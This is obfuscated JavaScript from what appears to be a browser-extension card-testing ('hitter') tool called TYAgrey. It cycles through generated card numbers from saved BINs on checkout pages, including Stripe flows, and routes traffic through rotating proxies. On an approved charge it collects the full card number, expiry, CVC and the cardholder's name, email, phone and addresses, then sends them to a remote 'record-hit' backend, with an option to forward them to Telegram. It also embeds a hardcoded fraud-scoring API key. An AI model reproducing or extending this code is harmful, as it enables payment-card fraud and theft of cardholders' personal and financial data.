      let _0x48b7f2 = _0x3a9278;
      let _0x4ad9ce = _0x5d43a4.siteUrl || window.location.href || "";
      let _0xecc458 = "";
      let _0x5b9950 = "";
      if (_0x5d43a4.merchant) {
        try {
          _0xecc458 = new URL(_0x5d43a4.merchant).hostname || "";
        } catch (_0x215510) {
          _0xecc458 = String(_0x5d43a4.merchant || "").trim();
        }
      }
      if (document.referrer) {
        try {
          _0x5b9950 = new URL(document.referrer).hostname || "";
        } catch (_0x41f684) {}
      }
      if (_0x3a9278.includes("stripe.com")) {
        _0x48b7f2 = _0x5b9950 || _0xecc458 || _0x3a9278;
        _0x4ad9ce = document.referrer || _0x4ad9ce || window.location.href || "";
      } else if (_0xecc458 && !_0xecc458.includes("stripe.com")) {
        _0x48b7f2 = _0xecc458;
      }
      const _0x1ec7e4 = [String(_0x5d43a4.fullCard || "").trim(), String(_0x48b7f2 || "").trim(), String(_0x5d43a4.amount || "0").trim(), String(_0x5d43a4.currency || "usd").trim().toLowerCase()].join("|");
      const _0x321012 = {
        token: _0x2cded1 || "",
        card_info: _0x5d43a4.fullCard,
        amount: _0x5d43a4.amount || "0",
        currency: _0x5d43a4.currency || "usd",
        site: _0x48b7f2,
        site_url: _0x4ad9ce,
        hit_key: _0x1ec7e4,
        timestamp: Date.now(),
        full_card_number: _0x5d43a4.fullCard,
        exp_month: (_0x5d43a4.fullCard || "").split("|")[1] || "",
        exp_year: (_0x5d43a4.fullCard || "").split("|")[2] || "",
        cvc: (_0x5d43a4.fullCard || "").split("|")[3] || extractedPaymentData.cvc || "",
        email: extractedPaymentData.email || "",
        full_name: extractedPaymentData.full_name || "",
        billing_address: extractedPaymentData.billing_address || "",
        billing_city: extractedPaymentData.billing_city || "",
        billing_state: extractedPaymentData.billing_state || "",
        billing_zip: extractedPaymentData.billing_zip || "",
        billing_country: extractedPaymentData.billing_country || "",
        phone: extractedPaymentData.phone || "",
        promo_code: extractedPaymentData.promo_code || "",
        shipping_address: extractedPaymentData.shipping_address || "",
        shipping_city: extractedPaymentData.shipping_city || "",
        shipping_state: extractedPaymentData.shipping_state || "",
        shipping_zip: extractedPaymentData.shipping_zip || "",
        shipping_country: extractedPaymentData.shipping_country || "",
        merchant_website: _0x48b7f2,
        charged_amount: _0x5d43a4.amount || "0"
      };
      await sendToBackground({
        type: "QUEUE_PENDING_HIT",
        hit: _0x321012
      });
      window.__tyagrey_hit_sync_timers = window.__tyagrey_hit_sync_timers || {};
      if (!window.__tyagrey_hit_sync_timers[_0x1ec7e4]) {
        window.__tyagrey_hit_sync_timers[_0x1ec7e4] = setTimeout(async () => {
          try {
            const _0xd15d0d = await sendToBackground({
              type: "API_REQUEST",
              endpoint: "record-hit",
              payload: _0x321012
            });
            if (_0xd15d0d && _0xd15d0d.success) {
              await sendToBackground({
                type: "REMOVE_PENDING_HIT",
                hit_key: _0x1ec7e4
              });
              const _0x3a5141 = (_0xd15d0d.message || "").toLowerCase().indexOf("duplicate") !== -1;
              if (!_0x3a5141) {
                userHitsCount = (userHitsCount || 0) + 1;
                markRecentHitWindow(5000);
                bumpLocalDashboardCounters(1, 0);
                prependLocalHistory({
                  card_info: _0x5d43a4.fullCard,
                  site: _0x48b7f2,
                  amount: _0x5d43a4.amount || "0",
                  status: "success",
                  created_at: new Date().toISOString()
                });
                try {
                  await sendToBackground({
                    type: "CACHE_MY_HIT",
                    hit: {
                      card_info: _0x5d43a4.fullCard,
                      site: _0x48b7f2,
                      amount: _0x5d43a4.amount || "0",
                      status: "success",
                      code: "APPROVED",
                      created_at: new Date().toISOString(),
                      timestamp: Date.now(),
                      hit_key: _0x1ec7e4
                    }
                  });
                } catch (_0x3cc4a5) {}
                console.log("[recordHit] Cloud sync successful");
              } else {
                console.log("[recordHit] Duplicate hit skipped by backend");
              }
              if (userRole === "user" && typeof _0xd15d0d.daily_hits === "number") {
                dailyHitsCount = _0xd15d0d.daily_hits;
              }
              if (userRole === "user" && typeof _0xd15d0d.daily_limit === "number") {
                dailyHitLimit = _0xd15d0d.daily_limit;
              }
              updateIpBarUserInfo();
              fetchHitCounts();
              fetchDailyHits();
              if (userRole === "user") {
                updateStartButtonState();
              }
            } else {
              console.warn("[recordHit] Cloud sync failed, keeping in queue for retry:", _0xd15d0d ? _0xd15d0d.error : "No response");
              if (_0xd15d0d && (_0xd15d0d.status === 429 || _0xd15d0d.hits_today !== undefined)) {
                if (typeof _0xd15d0d.hits_today === "number") {
                  dailyHitsCount = _0xd15d0d.hits_today;
                }
                if (typeof _0xd15d0d.limit === "number") {
                  dailyHitLimit = _0xd15d0d.limit;
                }
                const _0x3c71ac = _0xd15d0d.error || _0xd15d0d.message || "Daily hit limit reached (" + dailyHitsCount + "/" + dailyHitLimit + ")";
                showWarning("⚠️ " + _0x3c71ac, "error");
                updateStartButtonState();
              }
            }
          } catch (_0x25cb7a) {
            console.error("[recordHit] Exception in delayed sync:", _0x25cb7a && _0x25cb7a.message ? _0x25cb7a.message : _0x25cb7a);
          } finally {
            try {
              clearTimeout(window.__tyagrey_hit_sync_timers[_0x1ec7e4]);
            } catch (_0x1912aa) {}
            delete window.__tyagrey_hit_sync_timers[_0x1ec7e4];
          }
        }, 3000);
      }
    } catch (_0xa2af11) {
      console.error("[recordHit] Exception:", _0xa2af11 && _0xa2af11.message ? _0xa2af11.message : _0xa2af11);
    }
  }
  function loadCardHistory() {
    return new Promise(_0x47798a => {
      cardHistory = [];
      _0x47798a();
    });
  }
  function saveCardHistory() {
    const _0x18e7d4 = {
      [K.LOGS]: cardHistory
    };
    window.postMessage({
      type: "tyagrey_STORAGE_REQUEST",
      requestId: "logs_" + Date.now(),
      action: "SET",
      data: _0x18e7d4
    }, "*");
  }
  loadCardHistory().then(() => {
    if (typeof updateHistoryDisplay === "function") {
      updateHistoryDisplay();
    }
  });
  let currentMode = "bin";
  let ccList = [];
  let currentCCIndex = 0;
  let isLoggedIn = false;
  let userId = "";
  let userChatId = "";
  let userFirstName = "";
  let userPfpUrl = "";
  let userHitsCount = 0;
  let userAttemptsCount = 0;
  let globalHitsCount = 0;
  let dailyHitsCount = 0;
  let dailyHitLimit = 5;
  const DEFAULT_PFP = (() => {
    try {
      const _0x1999f7 = document.querySelector("script[data-luis-hitter=\"true\"]");
      if (_0x1999f7) {
        const _0x4308df = _0x1999f7.getAttribute("data-icon-url");
        if (_0x4308df) {
          return _0x4308df;
        }
      }
      const _0x181011 = document.querySelector("meta[name=\"tyagrey-default-pfp\"]");
      if (_0x181011 && _0x181011.content) {
        return _0x181011.content;
      }
    } catch (_0xdbebd1) {}
    return "icons/icon128.png";
  })();
  let tgForwardEnabled = true;
  let hitSpeed = 1;
  let cardFieldsDetected = false;
  const notiSoundEnabled = true;
  let soundVolume = 1;
  let customName = "";
  let customEmail = "";
  const COUNTRY_REGION_STORAGE_KEY = K.COUNTRY_REGION_SETTINGS || "tyagrey_country_region_settings";
  let countryRegionEnabled = true;
  let countryRegionCode = "US";
  let countryRegionName = "United States";
  const COUNTRY_CODES = ["AF", "AX", "AL", "DZ", "AS", "AD", "AO", "AI", "AQ", "AG", "AR", "AM", "AW", "AU", "AT", "AZ", "BS", "BH", "BD", "BB", "BY", "BE", "BZ", "BJ", "BM", "BT", "BO", "BQ", "BA", "BW", "BV", "BR", "IO", "BN", "BG", "BF", "BI", "CV", "KH", "CM", "CA", "KY", "CF", "TD", "CL", "CN", "CX", "CC", "CO", "KM", "CG", "CD", "CK", "CR", "CI", "HR", "CU", "CW", "CY", "CZ", "DK", "DJ", "DM", "DO", "EC", "EG", "SV", "GQ", "ER", "EE", "SZ", "ET", "FK", "FO", "FJ", "FI", "FR", "GF", "PF", "TF", "GA", "GM", "GE", "DE", "GH", "GI", "GR", "GL", "GD", "GP", "GU", "GT", "GG", "GN", "GW", "GY", "HT", "HM", "VA", "HN", "HK", "HU", "IS", "IN", "ID", "IR", "IQ", "IE", "IM", "IL", "IT", "JM", "JP", "JE", "JO", "KZ", "KE", "KI", "KP", "KR", "KW", "KG", "LA", "LV", "LB", "LS", "LR", "LY", "LI", "LT", "LU", "MO", "MG", "MW", "MY", "MV", "ML", "MT", "MH", "MQ", "MR", "MU", "YT", "MX", "FM", "MD", "MC", "MN", "ME", "MS", "MA", "MZ", "MM", "NA", "NR", "NP", "NL", "NC", "NZ", "NI", "NE", "NG", "NU", "NF", "MK", "MP", "NO", "OM", "PK", "PW", "PS", "PA", "PG", "PY", "PE", "PH", "PN", "PL", "PT", "PR", "QA", "RE", "RO", "RU", "RW", "BL", "SH", "KN", "LC", "MF", "PM", "VC", "WS", "SM", "ST", "SA", "SN", "RS", "SC", "SL", "SG", "SX", "SK", "SI", "SB", "SO", "ZA", "GS", "SS", "ES", "LK", "SD", "SR", "SJ", "SE", "CH", "SY", "TW", "TJ", "TZ", "TH", "TL", "TG", "TK", "TO", "TT", "TN", "TR", "TM", "TC", "TV", "UG", "UA", "AE", "GB", "US", "UM", "UY", "UZ", "VU", "VE", "VN", "VG", "VI", "WF", "EH", "YE", "ZM", "ZW"];
  const COUNTRY_DISPLAY_NAMES = function () {
    const _0x2d9f6a = {};
    const _0x46e565 = typeof Intl !== "undefined" && Intl.DisplayNames ? new Intl.DisplayNames(["en"], {
      type: "region"
    }) : null;
    COUNTRY_CODES.forEach(function (_0x118b0b) {
      _0x2d9f6a[_0x118b0b] = _0x46e565 ? _0x46e565.of(_0x118b0b) || _0x118b0b : _0x118b0b;
    });
    return _0x2d9f6a;
  }();
  let globalStorageLoaded = false;
  let proxyEnabled = false;
  let proxyString = "";
  let proxyInfo = {
    ip: "",
    response_time_ms: 0,
    country_name: "",
    country_code: "",
    ip_type: ""
  };
  let proxyList = [];
  let proxyAutoRotate = false;
  const IP_FRAUD_API_KEY = "tyagrey_ipqs_api_key";
  const DEFAULT_IPQS_API_KEY = "BwKEXCuVWkRCetqRfHJYwvNFTnfcebRm";
  let ipFraudApiKey = localStorage.getItem(IP_FRAUD_API_KEY) || DEFAULT_IPQS_API_KEY;
  function syncProxyFromModule() {
    if (window.tyagreyProxy) {
      proxyEnabled = window.tyagreyProxy.enabled;
      proxyString = window.tyagreyProxy.string;
      proxyInfo = window.tyagreyProxy.info;
      proxyList = window.tyagreyProxy.list || [];
      proxyAutoRotate = !!window.tyagreyProxy.autoRotate;
    }
  }
  function syncProxyToModule() {
    if (window.tyagreyProxy) {
      window.tyagreyProxy.enabled = proxyEnabled;
      window.tyagreyProxy.string = proxyString;
      window.tyagreyProxy.info = proxyInfo;
      window.tyagreyProxy.list = proxyList;
      window.tyagreyProxy.autoRotate = proxyAutoRotate;
    }
  }
  function checkProxyLive(_0x478dc1) {
    if (window.tyagreyProxy) {
      return window.tyagreyProxy.checkProxyLive(_0x478dc1);
    } else {
      return Promise.resolve({
        success: false,
        error: "Module not loaded"
      });
    }
  }
  function parseProxyFormat(_0x28b8cb) {
    if (window.tyagreyProxy) {
      return window.tyagreyProxy.parseProxyFormat(_0x28b8cb);
    } else {
      return null;
    }
  }
  function obfuscateProxy(_0x450009) {
    if (window.tyagreyProxy) {
      return window.tyagreyProxy.obfuscateProxy(_0x450009);
    } else {
      return "Not set";
    }
  }
  async function loadProxySettings() {
    if (window.tyagreyProxy) {
      await window.tyagreyProxy.loadProxySettings();
      syncProxyFromModule();
    }
  }
  async function saveProxySettings() {
    syncProxyToModule();
    if (window.tyagreyProxy) {
      await window.tyagreyProxy.saveProxySettings();
    }
  }
  function clearSavedProxy(_0x5cebbc) {
    if (window.tyagreyProxy) {
      window.tyagreyProxy.clearSavedProxy(_0x5cebbc, showWarning, updateBottomIpBar, fetchRealIp);
      syncProxyFromModule();
    }
  }
  function clearSavedProxyQuiet(_0xa53d01) {
    if (window.tyagreyProxy) {
      window.tyagreyProxy.clearSavedProxyQuiet(_0xa53d01, updateBottomIpBar, fetchRealIp);
      syncProxyFromModule();
    }
  }
  async function autoLoadAndVerifyProxy() {
    if (window.tyagreyProxy) {
      await window.tyagreyProxy.autoLoadAndVerifyProxy(updateBottomIpBar, fetchRealIp);
      syncProxyFromModule();
    }
  }
  let binLibrary = [];
  async function fetchBinLibrary() {
    return false;
  }
  function renderBinLibraryGrid() {}
  function checkBinRecommendation() {}
  function showBinRecommendationPopup() {}
  async function checkNewBinNotification() {
    return false;
  }
  function showNewBinNotification(_0x430cb7) {
    return Promise.resolve();
  }
  syncProxyFromModule();
  function initGlobalStorage() {
    return new Promise(_0x155e39 => {
      if (!window.tyagreyStorage || !window.tyagreyStorage.loadAllData) {
        globalStorageLoaded = true;
        _0x155e39();
        return;
      }
      window.tyagreyStorage.loadAllData(function (_0x2bc355) {
        _0x2bc355 = _0x2bc355 || {};
        let _0xc5e41c = [];
        if (_0x2bc355[K.SAVED_BINS]) {
          let _0x15cf23 = _0x2bc355[K.SAVED_BINS];
          if (typeof _0x15cf23 === "string") {
            try {
              _0x15cf23 = JSON.parse(_0x15cf23);
            } catch (_0x51bb6b) {
              _0x15cf23 = [];
            }
          }
          if (Array.isArray(_0x15cf23) && _0x15cf23.length > 0) {
            _0xc5e41c = [...new Set(_0x15cf23.filter(_0x2a36df => _0x2a36df && String(_0x2a36df).trim().length >= 6))];
            localStorage.setItem(K.SAVED_BINS, JSON.stringify(_0xc5e41c));
          }
        }
        let _0x13da18 = _0x2bc355[K.PANEL_QUICK_BINS];
        if (_0x13da18 !== undefined && Array.isArray(_0x13da18)) {
          savedBINs = [...new Set(_0x13da18.filter(_0x5272dd => _0x5272dd && String(_0x5272dd).trim().length >= 6))];
          localStorage.setItem(K.PANEL_QUICK_BINS, JSON.stringify(savedBINs));
        } else if (_0xc5e41c.length > 0) {
          savedBINs = _0xc5e41c.slice();
        }
        if (_0x2bc355[K.BG_COLOR]) {
          pageBackgroundColor = _0x2bc355[K.BG_COLOR];
          localStorage.setItem(K.PAGE_BG_COLOR, _0x2bc355[K.BG_COLOR]);
        }
        if (_0x2bc355[K.PAGE_HAS_CUSTOM] !== undefined) {
          userHasSetCustomColor = _0x2bc355[K.PAGE_HAS_CUSTOM] === true || _0x2bc355[K.PAGE_HAS_CUSTOM] === "true";
        }
        if (_0x2bc355[K.LOGS]) {
          let _0x5d589a = _0x2bc355[K.LOGS];
          if (typeof _0x5d589a === "string") {
            try {
              _0x5d589a = JSON.parse(_0x5d589a);
            } catch (_0x57b8c9) {
              _0x5d589a = [];
            }
          }
          if (Array.isArray(_0x5d589a)) {
            cardHistory = _0x5d589a;
          }
        }
        if (_0x2bc355[K.LOGS_CLEARED_AT]) {}
        if (_0x2bc355[K.CUSTOM_NAME]) {
          customName = _0x2bc355[K.CUSTOM_NAME];
          localStorage.setItem(K.CUSTOM_NAME, _0x2bc355[K.CUSTOM_NAME]);
        }
        if (_0x2bc355[K.CUSTOM_EMAIL]) {
          customEmail = _0x2bc355[K.CUSTOM_EMAIL];
          localStorage.setItem(K.CUSTOM_EMAIL, _0x2bc355[K.CUSTOM_EMAIL]);
        }
        if (_0x2bc355[K.TOKEN]) {
          localStorage.setItem(K.TOKEN, _0x2bc355[K.TOKEN]);
        }
        if (_0x2bc355[K.USER_ID]) {
          userId = _0x2bc355[K.USER_ID];
          localStorage.setItem(K.USER_ID, _0x2bc355[K.USER_ID]);
        }
        if (_0x2bc355[K.CHAT_ID]) {
          userChatId = _0x2bc355[K.CHAT_ID];
          localStorage.setItem(K.CHAT_ID, _0x2bc355[K.CHAT_ID]);
        }
        if (_0x2bc355[K.FIRST_NAME]) {
          userFirstName = _0x2bc355[K.FIRST_NAME];
          localStorage.setItem(K.FIRST_NAME, _0x2bc355[K.FIRST_NAME]);
        }
        if (_0x2bc355[K.SAVED_ID]) {
          savedId = _0x2bc355[K.SAVED_ID];
          localStorage.setItem(K.SAVED_ID, _0x2bc355[K.SAVED_ID]);
        }
        if (_0x2bc355[K.HAS_CUSTOM_COLOR] !== undefined) {
          localStorage.setItem(K.HAS_CUSTOM_COLOR, _0x2bc355[K.HAS_CUSTOM_COLOR]);
        }
        if (_0x2bc355[K.BG_ENABLED] !== undefined) {
          localStorage.setItem(K.BG_ENABLED, _0x2bc355[K.BG_ENABLED]);
        }
        if (_0x2bc355[K.PAGE_BG_COLOR]) {
          localStorage.setItem(K.PAGE_BG_COLOR, _0x2bc355[K.PAGE_BG_COLOR]);
        }
        if (_0x2bc355[K.TOGGLE_TG_FORWARD] !== undefined) {
          tgForwardEnabled = _0x2bc355[K.TOGGLE_TG_FORWARD] !== false && _0x2bc355[K.TOGGLE_TG_FORWARD] !== "false";
          localStorage.setItem(K.TOGGLE_TG_FORWARD, tgForwardEnabled);
        }
        if (_0x2bc355[K.TOGGLE_HIT_SOUND] !== undefined) {
          localStorage.setItem(K.TOGGLE_HIT_SOUND, _0x2bc355[K.TOGGLE_HIT_SOUND]);
        }
        if (_0x2bc355[K.TOGGLE_AUTO_SS] !== undefined) {
          localStorage.setItem(K.TOGGLE_AUTO_SS, _0x2bc355[K.TOGGLE_AUTO_SS]);
        }
        if (_0x2bc355[K.PROXY_ENABLED] !== undefined) {
          localStorage.setItem(K.PROXY_ENABLED, _0x2bc355[K.PROXY_ENABLED]);
        }
        if (_0x2bc355[K.PROXY_STRING]) {
          localStorage.setItem(K.PROXY_STRING, _0x2bc355[K.PROXY_STRING]);
        }
        if (_0x2bc355[K.PROXY_INFO]) {
          localStorage.setItem(K.PROXY_INFO, typeof _0x2bc355[K.PROXY_INFO] === "object" ? JSON.stringify(_0x2bc355[K.PROXY_INFO]) : _0x2bc355[K.PROXY_INFO]);
        }
        if (_0x2bc355[K.MUSIC_NAME]) {
          localStorage.setItem(K.MUSIC_NAME, _0x2bc355[K.MUSIC_NAME]);
        }
        if (_0x2bc355[K.CARD_HISTORY]) {
          let _0x5155b4 = _0x2bc355[K.CARD_HISTORY];
          if (typeof _0x5155b4 === "string") {
            try {
              _0x5155b4 = JSON.parse(_0x5155b4);
            } catch (_0x5acac8) {
              _0x5155b4 = [];
            }
          }
          if (Array.isArray(_0x5155b4)) {
            localStorage.setItem(K.CARD_HISTORY, JSON.stringify(_0x5155b4));
          }
        }
        if (_0x2bc355[K.LAST_SEEN_BIN_TIME]) {
          localStorage.setItem(K.LAST_SEEN_BIN_TIME, _0x2bc355[K.LAST_SEEN_BIN_TIME]);
        }
        globalStorageLoaded = true;
        _0x155e39();
      });
      setTimeout(() => {
        if (!globalStorageLoaded) {
          globalStorageLoaded = true;
          _0x155e39();
        }
      }, 3000);
    });
  }
  function saveToGlobalStorage(_0x4f83d4, _0x5d1a7f) {
    const _0x386877 = {
      [_0x4f83d4]: _0x5d1a7f
    };
    window.postMessage({
      type: "tyagrey_STORAGE_REQUEST",
      requestId: "save_" + Date.now(),
      action: "SET",
      data: _0x386877
    }, "*");
    localStorage.setItem(_0x4f83d4, typeof _0x5d1a7f === "object" ? JSON.stringify(_0x5d1a7f) : _0x5d1a7f);
  }
  initGlobalStorage();
  function loadCustomNameEmail() {
    return new Promise(_0x3292e7 => {
      if (window.tyagreyStorage && window.tyagreyStorage.loadAllData) {
        window.tyagreyStorage.loadAllData(function (_0x514eee) {
          _0x514eee = _0x514eee || {};
          customName = _0x514eee[K.CUSTOM_NAME] || localStorage.getItem(K.CUSTOM_NAME) || "";
          customEmail = _0x514eee[K.CUSTOM_EMAIL] || localStorage.getItem(K.CUSTOM_EMAIL) || "";
          _0x3292e7({
            name: customName,
            email: customEmail
          });
        });
        setTimeout(() => _0x3292e7({
          name: customName,
          email: customEmail
        }), 2000);
      } else {
        customName = localStorage.getItem(K.CUSTOM_NAME) || "";
        customEmail = localStorage.getItem(K.CUSTOM_EMAIL) || "";
        _0x3292e7({
          name: customName,
          email: customEmail
        });
      }
    });
  }
  function saveCustomName(_0x9f6403) {
    customName = _0x9f6403;
    localStorage.setItem(K.CUSTOM_NAME, _0x9f6403);
    if (window.tyagreyStorage && window.tyagreyStorage.saveCustomName) {
      window.tyagreyStorage.saveCustomName(_0x9f6403);
    }
  }
  function saveCustomEmail(_0x147562) {
    customEmail = _0x147562;
    localStorage.setItem(K.CUSTOM_EMAIL, _0x147562);
    if (window.tyagreyStorage && window.tyagreyStorage.saveCustomEmail) {
      window.tyagreyStorage.saveCustomEmail(_0x147562);
    }
  }
  function loadCountryRegionSettings() {
    return new Promise(_0x547ef4 => {
      const _0x54de44 = function (_0x148cc1) {
        _0x148cc1 = _0x148cc1 || {};
        countryRegionEnabled = _0x148cc1.enabled !== false;
        countryRegionCode = _0x148cc1.countryCode || "US";
        countryRegionName = _0x148cc1.countryName || COUNTRY_DISPLAY_NAMES[countryRegionCode] || "United States";
        _0x547ef4({
          enabled: countryRegionEnabled,
          countryCode: countryRegionCode,
          countryName: countryRegionName
        });
      };
      if (window.tyagreyStorage && window.tyagreyStorage.loadCountryRegionSettings) {
        window.tyagreyStorage.loadCountryRegionSettings(function (_0x36c4dc) {
          _0x54de44(_0x36c4dc);
        });
      } else {
        try {
          const _0x481489 = localStorage.getItem(COUNTRY_REGION_STORAGE_KEY);
          _0x54de44(_0x481489 ? JSON.parse(_0x481489) : null);
        } catch (_0x5b0cee) {
          _0x54de44(null);
        }
      }
    });
  }
  function saveCountryRegionSettings(_0xb2c8e) {
    const _0x1f5cb7 = {
      enabled: _0xb2c8e.enabled !== false,
      countryCode: _0xb2c8e.countryCode || "US",
      countryName: _0xb2c8e.countryName || COUNTRY_DISPLAY_NAMES[_0xb2c8e.countryCode || "US"] || "United States"
    };
    countryRegionEnabled = _0x1f5cb7.enabled;
    countryRegionCode = _0x1f5cb7.countryCode;
    countryRegionName = _0x1f5cb7.countryName;
    localStorage.setItem(COUNTRY_REGION_STORAGE_KEY, JSON.stringify(_0x1f5cb7));
    if (window.tyagreyStorage && window.tyagreyStorage.saveCountryRegionSettings) {
      window.tyagreyStorage.saveCountryRegionSettings(_0x1f5cb7);
    } else {
      saveToGlobalStorage(COUNTRY_REGION_STORAGE_KEY, _0x1f5cb7);
    }
  }
  loadCustomNameEmail().then(({
    name: _0x1e6f7d,
    email: _0x5d80e9
  }) => {
    const _0x176bd7 = document.getElementById("customNameInput");
    const _0x5ec86f = document.getElementById("customEmailInput");
    if (_0x176bd7) {
      _0x176bd7.value = _0x1e6f7d;
    }
    if (_0x5ec86f) {
      _0x5ec86f.value = _0x5d80e9;
    }
  });
  loadCountryRegionSettings().then(function (_0x5a5913) {
    countryRegionEnabled = _0x5a5913.enabled;
    countryRegionCode = _0x5a5913.countryCode;
    countryRegionName = _0x5a5913.countryName;
  });
  let isMusicPlaying = false;
  const autoSSEnabled = true;
  const autoSubmitInterval = null;
  let savedBINs = [];
  let currentBinIndex = 0;
  let savedId = "";
  let binBlurTimeout;
  let idBlurTimeout;
  let successStartTime = null;
  let cardAttemptStartTime = null;
  const extractedPaymentData = {
    cardNumber: "",
    bin: "",
    amount: "0",
    currency: "",
    email: "",
    businessUrl: "",
    successUrl: "",
    full_name: "",
    billing_address: "",
    billing_city: "",
    billing_state: "",
    billing_zip: "",
    billing_country: "",
    phone: "",
    promo_code: "",
    shipping_address: "",
    shipping_city: "",
    shipping_state: "",
    shipping_zip: "",
    shipping_country: "",
    cvc: "",
    ip: ""
  };
  let paymentDataFound = false;
  function getSavedCCList() {
    const _0x284db1 = localStorage.getItem("tyagrey_saved_ccs");
    if (_0x284db1) {
      try {
        return JSON.parse(_0x284db1);
      } catch (_0x3422f3) {}
    }
    return [];
  }
  function setSavedCCList(_0x263599) {
    localStorage.setItem("tyagrey_saved_ccs", JSON.stringify(_0x263599.slice(0, 20)));
  }
  function getSavedBIN() {
    if (savedBINs.length === 0) {
      const _0x3f1145 = localStorage.getItem(K.SAVED_BINS);
      console.log("[TYAgrey] getSavedBIN reading key:", K.SAVED_BINS, "value:", _0x3f1145);
      if (_0x3f1145) {
        try {
          savedBINs = JSON.parse(_0x3f1145);
        } catch (_0x23b375) {
          const _0x357002 = localStorage.getItem(K.SAVED_BINS);
          if (_0x357002) {
            savedBINs = [_0x357002];
          }
        }
      }
    }
    const _0x51b2d6 = savedBINs[currentBinIndex] || savedBINs[0] || "";
    console.log("[TYAgrey] getSavedBIN returning:", _0x51b2d6, "savedBINs:", savedBINs);
    return _0x51b2d6;
  }
  const OVERLAY_BIN_KEY = "tyagrey_overlay_bin";
  function setSavedBIN(_0xdbf5d0) {
    if (!_0xdbf5d0 || _0xdbf5d0.length < 6) {
      return;
    }
    savedBINs = [_0xdbf5d0];
    currentBinIndex = 0;
    localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs));
    localStorage.setItem(K.PANEL_QUICK_BINS, JSON.stringify(savedBINs));
    localStorage.setItem(OVERLAY_BIN_KEY, _0xdbf5d0);
    if (window.tyagreyStorage && window.tyagreyStorage.saveBINs) {
      window.tyagreyStorage.saveBINs(savedBINs);
    }
    if (window.tyagreyStorage && window.tyagreyStorage.savePanelQuickBins) {
      window.tyagreyStorage.savePanelQuickBins(savedBINs);
    }
    console.log("[TYAgrey] setSavedBIN:", _0xdbf5d0, "key:", K.SAVED_BINS, "overlayKey:", OVERLAY_BIN_KEY);
  }
  function getOverlaySavedBIN() {
    const _0x2bb3ea = localStorage.getItem(OVERLAY_BIN_KEY);
    if (_0x2bb3ea && _0x2bb3ea.length >= 6) {
      return _0x2bb3ea;
    }
    return getSavedBIN();
  }
  function getBinInputsContainerEl() {
    const _0x43ff81 = document.querySelector(".card-generator-overlay");
    if (_0x43ff81) {
      const _0x20d437 = _0x43ff81.querySelector("#binInputsContainer");
      if (_0x20d437) {
        return _0x20d437;
      }
    }
    return document.getElementById("binInputsContainer");
  }
  function getPanelBinInputElements() {
    const _0xed3cb6 = getBinInputsContainerEl();
    if (!_0xed3cb6) {
      return [];
    }
    return Array.from(_0xed3cb6.querySelectorAll(".bin-input"));
  }
  function getSelectedBIN() {
    const _0x4b1de8 = getBinInputsContainerEl();
    const _0x19fc67 = _0x4b1de8?.querySelector(".bin-input-selected");
    if (_0x19fc67 && _0x19fc67.value.trim()) {
      return _0x19fc67.value.trim();
    }
    return getSavedBIN();
  }
  function setCurrentBin(_0x85b7a6) {
    if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
      try {
        chrome.storage.local.set({
          tyagrey_current_bin: _0x85b7a6 || ""
        });
      } catch (_0xcabfba) {}
    }
  }
  function normalizeBinArray(_0x435f73) {
    return [...new Set((_0x435f73 || []).filter(_0x9cac15 => _0x9cac15 && String(_0x9cac15).trim().length >= 6))];
  }
  function isExplicitPanelQuickBins(_0x24410b) {
    return _0x24410b !== undefined && Array.isArray(_0x24410b);
  }
  function applyCloudBinsCache(_0x1b4601) {
    const _0x5b4199 = normalizeBinArray(_0x1b4601);
    if (window.tyagreyStorage && window.tyagreyStorage.saveBINs) {
      window.tyagreyStorage.saveBINs(_0x5b4199);
    }
    localStorage.setItem(K.SAVED_BINS, JSON.stringify(_0x5b4199));
  }
  function applyPanelBinsCache(_0x14fe6b) {
    const _0x488ec6 = normalizeBinArray(_0x14fe6b);
    if (window.tyagreyStorage && window.tyagreyStorage.savePanelQuickBins) {
      window.tyagreyStorage.savePanelQuickBins(_0x488ec6);
    }
    localStorage.setItem(K.PANEL_QUICK_BINS, JSON.stringify(_0x488ec6));
    return _0x488ec6;
  }
  function getBinSyncStatusEl() {
    return document.getElementById("binSyncStatus");
  }
  function setBinSyncStatus(_0x53cd3d, _0x913686) {
    const _0x1c8ba3 = getBinSyncStatusEl();
    if (!_0x1c8ba3) {
      return;
    }
    _0x1c8ba3.textContent = _0x53cd3d || "";
    _0x1c8ba3.classList.toggle("hidden", !_0x913686);
    _0x1c8ba3.classList.toggle("visible", _0x913686);
  }
  function persistPanelQuickBins(_0x5c284c) {
    savedBINs = normalizeBinArray(_0x5c284c);
    if (window.tyagreyStorage && window.tyagreyStorage.savePanelQuickBins) {
      window.tyagreyStorage.savePanelQuickBins(savedBINs);
    }
    localStorage.setItem(K.PANEL_QUICK_BINS, JSON.stringify(savedBINs));
    setCurrentBin(getSavedBIN());
  }
  function savePanelBinsLocalOnly(_0x197df1) {
    persistPanelQuickBins(_0x197df1);
  }
  function clearPanelQuickBinsCache() {
    localStorage.removeItem(K.PANEL_QUICK_BINS);
    if (window.tyagreyStorage && window.tyagreyStorage.removePanelQuickBins) {
      window.tyagreyStorage.removePanelQuickBins();
    }
  }
  function saveBINs(_0x4da2c8, _0x6e8d2f = {}) {
    const _0x25026e = _0x6e8d2f.panelOnly === true;
    persistPanelQuickBins(_0x4da2c8);
    if (_0x25026e) {
      return Promise.resolve({
        success: true,
        panelOnly: true,
        saved_panel_bins: savedBINs.slice()
      });
    }
    if (typeof sendToBackground !== "function") {
      return Promise.resolve({
        success: false,
        error: "Background bridge unavailable"
      });
    }
    setBinSyncStatus("Saving panel BINs...", true);
    return sendToBackground({
      type: "SAVE_PANEL_BINS",
      payload: {
        panel_bins: savedBINs
      }
    }).then(_0x5c4c32 => {
      if (_0x5c4c32 && _0x5c4c32.success && Array.isArray(_0x5c4c32.saved_panel_bins)) {
        savedBINs = applyPanelBinsCache(_0x5c4c32.saved_panel_bins);
        populateBinInputs();
        updateSwitchBtnVisibility();
        clearPanelQuickBinsCache();
      }
      return _0x5c4c32 || {
        success: false,
        error: "Empty response"
      };
    }).catch(_0x147045 => ({
      success: false,
      error: _0x147045 && _0x147045.message ? _0x147045.message : "Save failed"
    })).finally(() => {
      setBinSyncStatus("", false);
    });
  }
  function switchBin() {
    if (savedBINs.length <= 1) {
      return;
    }
    currentBinIndex = (currentBinIndex + 1) % savedBINs.length;
    const _0x28f1cc = savedBINs[currentBinIndex];
    setCurrentBin(_0x28f1cc);
    showWarning("Bin Switch To: " + _0x28f1cc, "info");
    updateBinStatus();
    updateSelectedBinHighlight(true);
  }
  function getSavedId() {
